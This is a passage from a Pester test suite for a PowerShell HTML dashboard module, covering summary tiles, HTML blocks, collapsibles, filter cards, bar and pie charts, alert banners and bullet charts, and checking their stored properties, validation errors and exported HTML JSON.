            @{ Label='Docs'; Value=42; Action=@{ Url='https://example.com' } }
        )
        $report['Summary'][0].Action.Url     | Should -Be 'https://example.com'
        $report['Summary'][0].Action.TableId | Should -Be ''
    }

    It 'Tile Action without TableId or Url throws' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Action=@{ Label='Click' } }
        ) } | Should -Throw
    }

    It 'Tile Action with both TableId and Url throws' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Action=@{ TableId='t'; Url='https://x' } }
        ) } | Should -Throw
    }

    It 'HTML emits action JSON on tile when set' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_TileAct_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='Errors'; Value=3
                   Action=@{ Label='View errors'; TableId='incidents'; Filter='critical' } }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-tile-action.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"action":\{.*"tableId":"incidents".*"filter":"critical"'
            $content | Should -Match 'tile-clickable'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML contains sparkline array, style and bounds in SUMMARY_CONFIG' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SparkTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='CPU 24h'; Value=42; Sparkline=@(10,20,30,25,40); SparklineStyle='area'; SparklineMin=0; SparklineMax=100 }
                @{ Label='Reqs';    Value=99; Sparkline=@(5,8,3,9);        SparklineStyle='bars' }
                @{ Label='Plain';   Value=7 }  # no sparkline
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-spark.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            # First tile — area style with explicit bounds
            $content | Should -Match '"sparkline":\[10,20,30,25,40\]'
            $content | Should -Match '"sparklineStyle":"area"'
            $content | Should -Match '"sparklineMin":0'
            $content | Should -Match '"sparklineMax":100'
            # Second tile — bars with null bounds
            $content | Should -Match '"sparkline":\[5,8,3,9\]'
            $content | Should -Match '"sparklineStyle":"bars"'
            # Third tile — must NOT carry any sparkline keys
            $content | Should -Match '"label":"Plain"'
            # SPARK helper present
            $content | Should -Match 'var SPARK\s*=\s*\{'
            $content | Should -Match 'spark-svg'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhHtmlBlock
# ---------------------------------------------------------------------------
Describe 'Add-DhHtmlBlock' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Adds a block to the report Blocks list' {
        Add-DhHtmlBlock -Report $report -Id 'intro' -Content '<p>Hello</p>'
        $report['Blocks'] | Should -Not -BeNullOrEmpty
        $report['Blocks'].Count | Should -Be 1
    }

    It 'Stores BlockType as html' {
        Add-DhHtmlBlock -Report $report -Id 'b1' -Content '<p>x</p>'
        $report['Blocks'][0].BlockType | Should -Be 'html'
    }

    It 'Stores Id, Title, Icon, Content, Style correctly' {
        Add-DhHtmlBlock -Report $report -Id 'note' -Title 'Info Note' -Icon '📋' `
            -Content '<p>Details here.</p>' -Style 'warn'
        $b = $report['Blocks'][0]
        $b.Id      | Should -Be 'note'
        $b.Title   | Should -Be 'Info Note'
        $b.Icon    | Should -Be '📋'
        $b.Content | Should -Be '<p>Details here.</p>'
        $b.Style   | Should -Be 'warn'
    }

    It 'Defaults Style to info' {
        Add-DhHtmlBlock -Report $report -Id 'b2' -Content '<p>x</p>'
        $report['Blocks'][0].Style | Should -Be 'info'
    }

    It 'Rejects invalid Style values' {
        { Add-DhHtmlBlock -Report $report -Id 'b3' -Content '<p>x</p>' -Style 'invalid' } |
            Should -Throw
    }

    It 'Rejects Id with invalid characters' {
        { Add-DhHtmlBlock -Report $report -Id 'bad id!' -Content '<p>x</p>' } |
            Should -Throw
    }

    It 'Multiple blocks accumulate in order' {
        Add-DhHtmlBlock -Report $report -Id 'first'  -Content '<p>1</p>'
        Add-DhHtmlBlock -Report $report -Id 'second' -Content '<p>2</p>'
        $report['Blocks'].Count     | Should -Be 2
        $report['Blocks'][0].Id     | Should -Be 'first'
        $report['Blocks'][1].Id     | Should -Be 'second'
    }

    It 'HTML contains block content in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_HtmlTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhHtmlBlock -Report $report -Id 'myblock' -Content '<p>UniqueMarker42</p>'
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data @([PSCustomObject]@{X=1})
            $htmlPath = Join-Path $tmpDir2 'test-htmlblock.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            (Get-Content $htmlPath -Raw) | Should -Match 'UniqueMarker42'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhCollapsible
# ---------------------------------------------------------------------------
Describe 'Add-DhCollapsible' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Adds a collapsible block to the report' {
        Add-DhCollapsible -Report $report -Id 'sec1' -Title 'Section' -Cards @(
            @{ Title='Card A'; Fields=@(@{Label='L';Value='V'}) }
        )
        $report['Blocks'] | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType | Should -Be 'collapsible'
    }

    It 'Stores Id, Title, Icon, DefaultOpen correctly' {
        Add-DhCollapsible -Report $report -Id 'sec2' -Title 'My Section' -Icon '🔑' `
            -DefaultOpen $false -Cards @(@{ Title='C'; Fields=@() })
        $b = $report['Blocks'][0]
        $b.Id          | Should -Be 'sec2'
        $b.Title       | Should -Be 'My Section'
        $b.Icon        | Should -Be '🔑'
        $b.DefaultOpen | Should -Be $false
    }

    It 'Badge equals card count' {
        Add-DhCollapsible -Report $report -Id 'sec3' -Title 'T' -Cards @(
            @{ Title='C1'; Fields=@() }
            @{ Title='C2'; Fields=@() }
            @{ Title='C3'; Fields=@() }
        )
        $report['Blocks'][0].Badge | Should -Be 3
    }

    It 'Normalises missing Badge and BadgeClass on cards' {
        Add-DhCollapsible -Report $report -Id 'sec4' -Title 'T' -Cards @(
            @{ Title='Card'; Fields=@(@{Label='K';Value='V'}) }
        )
        $card = $report['Blocks'][0].Cards[0]
        $card['Badge']      | Should -Be ''
        $card['BadgeClass'] | Should -Be ''
    }

    It 'Throws when card is missing Title key' {
        { Add-DhCollapsible -Report $report -Id 'sec5' -Title 'T' -Cards @(
              @{ Fields=@() }
          ) } | Should -Throw
    }

    It 'Throws when card is missing Fields key' {
        { Add-DhCollapsible -Report $report -Id 'sec6' -Title 'T' -Cards @(
              @{ Title='C' }
          ) } | Should -Throw
    }

    It 'Accepts free-form Content instead of Cards' {
        Add-DhCollapsible -Report $report -Id 'sec7' -Title 'Notes' `
            -Content '<p>Some notes here.</p>'
        $report['Blocks'][0].Content | Should -Be '<p>Some notes here.</p>'
    }

    It 'HTML contains block section shell in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_ColTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhCollapsible -Report $report -Id 'accounts' -Title 'Accounts' -Cards @(
                @{ Title='Prod'; Fields=@(@{Label='ID';Value='123'}) }
            )
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data @([PSCustomObject]@{X=1})
            $htmlPath = Join-Path $tmpDir2 'test-collapsible.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            (Get-Content $htmlPath -Raw) | Should -Match 'bsection-accounts'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhFilterCard
# ---------------------------------------------------------------------------
Describe 'Add-DhFilterCard' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        Add-DhTable -Report $report -TableId 'resources' -Title 'Resources' -Data @(
            [PSCustomObject]@{ Name='vm01'; Location='Italy North' }
            [PSCustomObject]@{ Name='vm02'; Location='West Europe' }
        )
    }

    It 'Adds a filtercardgrid block to the report' {
        Add-DhFilterCard -Report $report -Id 'loc-filter' -Title 'Filter by Location' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='Italy North'; Value='Italy North'; Count=1 })
        $report['Blocks'][0].BlockType | Should -Be 'filtercardgrid'
    }

    It 'Stores TargetTableId and FilterField correctly' {
        Add-DhFilterCard -Report $report -Id 'f1' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='L'; Value='V' })
        $b = $report['Blocks'][0]
        $b.TargetTableId | Should -Be 'resources'
        $b.FilterField   | Should -Be 'Location'
    }

    It 'Normalises optional card fields with safe defaults' {
        Add-DhFilterCard -Report $report -Id 'f2' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='Italy'; Value='Italy North' })
        $card = $report['Blocks'][0].Cards[0]
        $card['SubLabel'] | Should -Be ''
        $card['Count']    | Should -BeNullOrEmpty
        $card['Icon']     | Should -Be ''
    }

    It 'Throws when target table does not exist' {
        { Add-DhFilterCard -Report $report -Id 'f3' -Title 'T' `
              -TargetTableId 'nonexistent' -FilterField 'Location' `
              -Cards @(@{ Label='L'; Value='V' }) } | Should -Throw
    }

    It 'MultiFilter defaults to false (switch not present)' {
        Add-DhFilterCard -Report $report -Id 'f4' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -Cards @(@{ Label='L'; Value='V' })
        $report['Blocks'][0].MultiFilter.IsPresent | Should -Be $false
    }

    It 'MultiFilter switch can be set' {
        Add-DhFilterCard -Report $report -Id 'f5' -Title 'T' `
            -TargetTableId 'resources' -FilterField 'Location' `
            -MultiFilter `
            -Cards @(@{ Label='L'; Value='V' })
        $report['Blocks'][0].MultiFilter.IsPresent | Should -Be $true
    }
}

# ---------------------------------------------------------------------------
# Add-DhBarChart
# ---------------------------------------------------------------------------
Describe 'Add-DhBarChart' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        Add-DhTable -Report $report -TableId 'inventory' -Title 'Inventory' -Data @(
            [PSCustomObject]@{ Name='A'; Type='VM'      }
            [PSCustomObject]@{ Name='B'; Type='Disk'    }
            [PSCustomObject]@{ Name='C'; Type='VM'      }
            [PSCustomObject]@{ Name='D'; Type='Network' }
        )
    }

    It 'Adds a barchart block to the report' {
        Add-DhBarChart -Report $report -Id 'type-chart' -Title 'Types' `
            -TableId 'inventory' -Field 'Type'
        $report['Blocks'][0].BlockType | Should -Be 'barchart'
    }

    It 'Stores all configuration properties correctly' {
        Add-DhBarChart -Report $report -Id 'bc1' -Title 'Chart' `
            -TableId 'inventory' -Field 'Type' -TopN 5
        $b = $report['Blocks'][0]
        $b.Id      | Should -Be 'bc1'
        $b.TableId | Should -Be 'inventory'
        $b.Field   | Should -Be 'Type'
        $b.TopN    | Should -Be 5
    }

    It 'ShowPercent defaults to false (switch not present)' {
        Add-DhBarChart -Report $report -Id 'bc2' -Title 'T' `
            -TableId 'inventory' -Field 'Type'
        $report['Blocks'][0].ShowPercent.IsPresent | Should -Be $false
    }

    It 'ShowPercent switch can be set' {
        Add-DhBarChart -Report $report -Id 'bc3' -Title 'T' `
            -TableId 'inventory' -Field 'Type' -ShowPercent
        $report['Blocks'][0].ShowPercent.IsPresent | Should -Be $true
    }

    It 'ClickFilters switch can be set' {
        Add-DhBarChart -Report $report -Id 'bc4' -Title 'T' `
            -TableId 'inventory' -Field 'Type' -ClickFilters
        $report['Blocks'][0].ClickFilters.IsPresent | Should -Be $true
    }

    It 'Throws when source table does not exist' {
        { Add-DhBarChart -Report $report -Id 'bc5' -Title 'T' `
              -TableId 'nonexistent' -Field 'Type' } | Should -Throw
    }

    It 'Throws when TopN is zero or negative' {
        { Add-DhBarChart -Report $report -Id 'bc6' -Title 'T' `
              -TableId 'inventory' -Field 'Type' -TopN 0 } | Should -Throw
        { Add-DhBarChart -Report $report -Id 'bc7' -Title 'T' `
              -TableId 'inventory' -Field 'Type' -TopN -1 } | Should -Throw
    }

    It 'HTML contains barchart block in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_BarTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhBarChart -Report $report -Id 'bc-export' -Title 'Types Chart' `
                -TableId 'inventory' -Field 'Type' -TopN 5
            $htmlPath = Join-Path $tmpDir2 'test-barchart.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"barchart"'
            $content | Should -Match '"tableId":"inventory"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Stacked variant (v1.4 F12) ------------------------------------------
    It 'Stacked defaults to false (single-series unchanged)' {
        Add-DhBarChart -Report $report -Id 'bc-flat' -Title 'X' `
            -TableId 'inventory' -Field 'Type'
        $report['Blocks'][0].Stacked     | Should -Be $false
        $report['Blocks'][0].SeriesField | Should -BeNullOrEmpty
    }

    It '-Stacked + -SeriesField are stored' {
        Add-DhBarChart -Report $report -Id 'bc-stack' -Title 'X' `
            -TableId 'inventory' -Field 'Type' -SeriesField 'Status' -Stacked
        $report['Blocks'][0].Stacked     | Should -Be $true
        $report['Blocks'][0].SeriesField | Should -Be 'Status'
    }

    It '-Stacked without -SeriesField throws' {
        { Add-DhBarChart -Report $report -Id 'bc-bad' -Title 'X' `
              -TableId 'inventory' -Field 'Type' -Stacked } | Should -Throw
    }

    It '-SeriesField same as -Field throws' {
        { Add-DhBarChart -Report $report -Id 'bc-bad2' -Title 'X' `
              -TableId 'inventory' -Field 'Type' -SeriesField 'Type' -Stacked } | Should -Throw
    }

    It '-SeriesField alone (without -Stacked) auto-stacks' {
        # Least-surprising default: passing -SeriesField is a clear stacking intent
        Add-DhBarChart -Report $report -Id 'bc-auto' -Title 'X' `
            -TableId 'inventory' -Field 'Type' -SeriesField 'Status'
        $report['Blocks'][0].Stacked     | Should -Be $true
        $report['Blocks'][0].SeriesField | Should -Be 'Status'
    }

    It 'HTML contains stacked + seriesField in barchart JSON' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_StackTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhBarChart -Report $report -Id 'bc-html' -Title 'Items by Type stacked by Status' `
                -TableId 'inventory' -Field 'Type' -SeriesField 'Status' -Stacked -TopN 5
            $htmlPath = Join-Path $tmpDir2 'test-stacked.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"barchart"'
            $content | Should -Match '"stacked":true'
            $content | Should -Match '"seriesField":"Status"'
            $content | Should -Match 'function renderBarChartStacked'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhAlertBanner  (v1.4)
# ---------------------------------------------------------------------------
Describe 'Add-DhAlertBanner' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Adds a banner to the report AlertBanners list' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Hello' -Severity 'info'
        $report['AlertBanners'] | Should -Not -BeNullOrEmpty
        $report['AlertBanners'].Count | Should -Be 1
        $report['AlertBanners'][0].Id       | Should -Be 'b1'
        $report['AlertBanners'][0].Severity | Should -Be 'info'
        $report['AlertBanners'][0].Message  | Should -Be 'Hello'
    }

    It 'Defaults Severity to info' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Default sev test'
        $report['AlertBanners'][0].Severity | Should -Be 'info'
    }

    It 'Stores Dismissible flag' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Dismiss me' -Dismissible
        $report['AlertBanners'][0].Dismissible | Should -Be $true
    }

    It 'Dismissible defaults to false when switch not present' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Sticky'
        $report['AlertBanners'][0].Dismissible | Should -Be $false
    }

    It 'Accepts multiple banners in declaration order' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'First'  -Severity 'info'
        Add-DhAlertBanner -Report $report -Id 'b2' -Message 'Second' -Severity 'warning'
        Add-DhAlertBanner -Report $report -Id 'b3' -Message 'Third'  -Severity 'critical'
        $report['AlertBanners'].Count | Should -Be 3
        $report['AlertBanners'][0].Id | Should -Be 'b1'
        $report['AlertBanners'][2].Severity | Should -Be 'critical'
    }

    It 'Throws on duplicate Id' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'First'
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'Second' } | Should -Throw
    }

    It 'Throws on invalid Id characters' {
        { Add-DhAlertBanner -Report $report -Id 'bad id' -Message 'M' } | Should -Throw
        { Add-DhAlertBanner -Report $report -Id 'bad/id' -Message 'M' } | Should -Throw
    }

    It 'Throws on invalid Severity' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' -Severity 'panic' } | Should -Throw
    }

    It 'Stores Action with TableId + Filter' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
            -Action @{ Label='View'; TableId='items'; Filter='critical' }
        $a = $report['AlertBanners'][0].Action
        $a.Label   | Should -Be 'View'
        $a.TableId | Should -Be 'items'
        $a.Filter  | Should -Be 'critical'
        $a.Url     | Should -Be ''
    }

    It 'Stores Action with Url' {
        Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
            -Action @{ Label='Docs'; Url='https://example.com/kb' }
        $a = $report['AlertBanners'][0].Action
        $a.Label | Should -Be 'Docs'
        $a.Url   | Should -Be 'https://example.com/kb'
    }

    It 'Throws when Action is missing Label' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
              -Action @{ TableId='items' } } | Should -Throw
    }

    It 'Throws when Action has neither TableId nor Url' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
              -Action @{ Label='Click' } } | Should -Throw
    }

    It 'Throws when Action has both TableId and Url' {
        { Add-DhAlertBanner -Report $report -Id 'b1' -Message 'M' `
              -Action @{ Label='X'; TableId='items'; Url='https://x' } } | Should -Throw
    }

    It 'HTML contains ALERTS_CONFIG with banner message in exported report' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AlertTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhAlertBanner -Report $report -Id 'ab-crit' -Severity 'critical' `
                -Message '3 incidents open' -Dismissible `
                -Action @{ Label='View'; TableId='incidents'; Filter='critical' }
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'Incidents' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-alert.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"id":"ab-crit"'
            $content | Should -Match '"severity":"critical"'
            $content | Should -Match '"message":"3 incidents open"'
            $content | Should -Match '"dismissible":true'
            $content | Should -Match '"label":"View"'
            $content | Should -Match '"tableId":"incidents"'
            $content | Should -Match '"filter":"critical"'
            $content | Should -Match 'id="report-alerts"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML omits banners block when none declared (empty ALERTS_CONFIG)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AlertTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 't' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-no-alert.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match 'ALERTS_CONFIG\s*=\s*\[\]'
            $content | Should -Match 'id="report-alerts"'   # container still present (collapses via CSS :empty)
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- v1.4.2 — NavGroup binding on banners --------------------------------
    It 'Banner without NavGroup stores empty NavGroup (page-global)' {
        Add-DhAlertBanner -Report $report -Id 'b' -Message 'X' -Severity 'info'
        $report['AlertBanners'][0].NavGroup    | Should -BeNullOrEmpty
        $report['AlertBanners'][0].NavSubGroup | Should -BeNullOrEmpty
    }

    It 'Banner with -NavGroup stores the group' {
        Add-DhAlertBanner -Report $report -Id 'b' -Message 'X' -Severity 'info' -NavGroup 'Identity'
        $report['AlertBanners'][0].NavGroup | Should -Be 'Identity'
    }

    It 'Banner with -NavSubGroup stores both' {
        Add-DhAlertBanner -Report $report -Id 'b' -Message 'X' -Severity 'info' `
            -NavGroup 'Identity' -NavSubGroup 'Production'
        $report['AlertBanners'][0].NavGroup    | Should -Be 'Identity'
        $report['AlertBanners'][0].NavSubGroup | Should -Be 'Production'
    }

    It 'HTML emits navGroup attr when set' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AlertNav_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhAlertBanner -Report $report -Id 'b-id' -Severity 'warning' `
                -Message 'identity-scoped' -NavGroup 'Identity'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 't' -Title 'T' -Data $data -NavGroup 'Identity'
            $htmlPath = Join-Path $tmpDir2 'test-alert-nav.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"navGroup":"Identity"'
            # CSS hide-by-default rule emitted
            $content | Should -Match '\.alert-banner\[data-navgroup\]:not\(\.panel-active\)'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhPieChart  (v1.4)
# ---------------------------------------------------------------------------
Describe 'Add-DhPieChart' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $data = @(
            [PSCustomObject]@{ Name='alpha'; Region='us-east'; Status='Active' }
            [PSCustomObject]@{ Name='beta';  Region='eu-west'; Status='Active' }
            [PSCustomObject]@{ Name='gamma'; Region='us-east'; Status='Inactive' }
        )
        Add-DhTable -Report $script:report -TableId 'items' -Title 'Items' -Data $data
    }

    It 'Adds a piechart block to the report (Mode A — from table)' {
        Add-DhPieChart -Report $report -Id 'p1' -Title 'By region' `
            -TableId 'items' -Field 'Region'
        $report['Blocks'] | Should -Not -BeNullOrEmpty
        $b = $report['Blocks'][0]
        $b.BlockType | Should -Be 'piechart'
        $b.Mode      | Should -Be 'fromtable'
        $b.TableId   | Should -Be 'items'
        $b.Field     | Should -Be 'Region'
        $b.Style     | Should -Be 'donut'   # default
    }

    It 'Adds a piechart block (Mode B — explicit slices)' {
        Add-DhPieChart -Report $report -Id 'p2' -Title 'Costs' `
            -Slices @(
                @{ Label='us-east'; Value=12500 }
                @{ Label='eu-west'; Value=8200  }
            )
        $b = $report['Blocks'][0]
        $b.Mode | Should -Be 'explicit'
        $b.Slices.Count | Should -Be 2
        $b.Slices[0].Label | Should -Be 'us-east'
        $b.Slices[0].Value | Should -Be 12500
    }

    It 'Accepts Style = pie' {
        Add-DhPieChart -Report $report -Id 'p3' -Title 'X' `
            -TableId 'items' -Field 'Status' -Style 'pie'
        $report['Blocks'][0].Style | Should -Be 'pie'
    }

    It 'Rejects invalid Style values' {
        { Add-DhPieChart -Report $report -Id 'p4' -Title 'X' `
              -TableId 'items' -Field 'Status' -Style 'sphere' } | Should -Throw
    }

    It 'Throws when neither TableId nor Slices specified' {
        { Add-DhPieChart -Report $report -Id 'p5' -Title 'X' } | Should -Throw
    }

    It 'Throws when both TableId and Slices specified' {
        { Add-DhPieChart -Report $report -Id 'p6' -Title 'X' `
              -TableId 'items' -Field 'Status' `
              -Slices @(@{ Label='a'; Value=1 }) } | Should -Throw
    }

    It 'Throws when -TableId is set without -Field' {
        { Add-DhPieChart -Report $report -Id 'p7' -Title 'X' -TableId 'items' } | Should -Throw
    }

    It 'Throws when source table does not exist' {
        { Add-DhPieChart -Report $report -Id 'p8' -Title 'X' `
              -TableId 'nonexistent' -Field 'Status' } | Should -Throw
    }

    It 'Throws when a slice is missing Label' {
        { Add-DhPieChart -Report $report -Id 'p9' -Title 'X' `
              -Slices @(@{ Value=1 }) } | Should -Throw
    }

    It 'Throws when a slice is missing Value' {
        { Add-DhPieChart -Report $report -Id 'p10' -Title 'X' `
              -Slices @(@{ Label='a' }) } | Should -Throw
    }

    It 'Throws when a slice has a non-numeric Value' {
        { Add-DhPieChart -Report $report -Id 'p11' -Title 'X' `
              -Slices @(@{ Label='a'; Value='not-a-number' }) } | Should -Throw
    }

    It 'Throws when a slice has a negative Value' {
        { Add-DhPieChart -Report $report -Id 'p12' -Title 'X' `
              -Slices @(@{ Label='a'; Value=-5 }) } | Should -Throw
    }

    It 'Stores ClickFilters switch (Mode A)' {
        Add-DhPieChart -Report $report -Id 'p13' -Title 'X' `
            -TableId 'items' -Field 'Status' -ClickFilters
        $report['Blocks'][0].ClickFilters | Should -Be $true
    }

    It 'ClickFilters defaults to false' {
        Add-DhPieChart -Report $report -Id 'p14' -Title 'X' `
            -TableId 'items' -Field 'Status'
        $report['Blocks'][0].ClickFilters | Should -Be $false
    }

    It 'Preserves slice Color when supplied' {
        Add-DhPieChart -Report $report -Id 'p15' -Title 'X' `
            -Slices @(
                @{ Label='a'; Value=10; Color='#FF0000' }
                @{ Label='b'; Value=20 }
            )
        $report['Blocks'][0].Slices[0].Color | Should -Be '#FF0000'
        $report['Blocks'][0].Slices[1].Color | Should -Be ''
    }

    It 'HTML contains piechart block with style + mode (Mode A)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_PieTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhPieChart -Report $report -Id 'pie-A' -Title 'By status' `
                -TableId 'items' -Field 'Status' -ClickFilters -Style 'donut'
            $htmlPath = Join-Path $tmpDir2 'test-pie-a.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"piechart"'
            $content | Should -Match '"mode":"fromtable"'
            $content | Should -Match '"style":"donut"'
            $content | Should -Match '"tableId":"items"'
            $content | Should -Match '"field":"Status"'
            $content | Should -Match '"clickFilters":true'
            $content | Should -Match 'function renderPieChart'
            $content | Should -Match 'function buildPieSvg'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML contains piechart block with explicit slices (Mode B)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_PieTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhPieChart -Report $report -Id 'pie-B' -Title 'Costs' `
                -Style 'pie' `
                -Slices @(
                    @{ Label='us-east'; Value=12500 }
                    @{ Label='eu-west'; Value=8200  }
                )
            $htmlPath = Join-Path $tmpDir2 'test-pie-b.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"piechart"'
            $content | Should -Match '"mode":"explicit"'
            $content | Should -Match '"style":"pie"'
            $content | Should -Match '"label":"us-east"'
            $content | Should -Match '"value":12500'
            $content | Should -Match '"label":"eu-west"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhBullet  (v1.4 F10)
# ---------------------------------------------------------------------------
Describe 'Add-DhBullet' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:rag = @{
            Green = @{ Max = 50 }
            Amber = @{ Min = 50; Max = 80 }
            Red   = @{ Min = 80 }
        }
    }

    It 'Adds a bullet block to the report Blocks list' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='DC01'; Value=42; Target=50; Max=120; Unit='ms' }
        )
        $report['Blocks']               | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType  | Should -Be 'bullet'
        $report['Blocks'][0].Id         | Should -Be 'b1'
        @($report['Blocks'][0].Items).Count | Should -Be 1
    }

    It 'Normalises Min / Max with defaults 0 / 100' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42 }
        )
        $report['Blocks'][0].Items[0].Min | Should -Be 0
        $report['Blocks'][0].Items[0].Max | Should -Be 100
    }

    It 'Target is null when not supplied' {
